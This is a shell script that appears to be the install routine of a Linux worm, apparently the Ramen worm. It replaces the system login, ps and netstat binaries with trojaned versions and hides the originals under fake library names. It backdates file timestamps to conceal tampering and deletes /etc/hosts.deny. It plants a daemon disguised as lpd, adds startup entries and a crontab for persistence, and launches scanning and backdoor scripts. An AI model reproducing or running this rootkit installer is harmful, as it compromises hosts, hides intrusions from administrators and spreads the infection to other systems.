#!/bin/sh
mv /bin/login /usr/lib/ldliblogin.so
mv login /bin/login
./2
chmod 755 /bin/login
touch -t 0003071212 /bin/login
chmod 755 /usr/lib/ldliblogin.so
rm -f /etc/hosts.deny
./getip.sh
mv td /usr/bin/lpd
chmod 755 /usr/bin/lpd
/usr/bin/lpd
echo "/usr/bin/lpd" >> /etc/rc.d/rc.sysinit
gcc update.c -o update
mv update /usr/sbin/update
rm -f update.c
rm -f ramen.tar
rm -f ramen.tgz
tar zxvf ps.tgz
cd ps
make
mv /bin/ps /usr/lib/ldlibps.so
mv ps-trojan /bin/ps
cd ..
tar zxvf net.tgz
cd net
make
mv /bin/netstat /usr/lib/ldlibns.so
mv uni-netstat /bin/netstat
chmod 755 /bin/netstat
chmod 755 /bin/ps
cd ..
touch -t 0003071212 /bin/netstat
touch -t 0003071212 /bin/ps
touch -t 0003071212 *
touch -t 0003071212 /tmp/ramen.tgz
rm -rf ps
rm -rf net
crontab 1
if [ -f /etc/inetd.conf ]
then
cp synscan62 synscan
cp w62 w
cp l62 l
cp s62 s
cp randb62 randb
echo "/usr/src/.poop/start62.sh" >> /etc/rc.d/rc.sysinit
./bd62.sh
./start62.sh

else
cp synscan7 synscan
cp w7 w
cp l7 l
cp s7 s
cp randb7 randb
echo "/usr/src/.poop/start7.sh" >> /etc/rc.d/rc.sysinit
./bd7.sh
./start7.sh
fi
rm -f start.sh
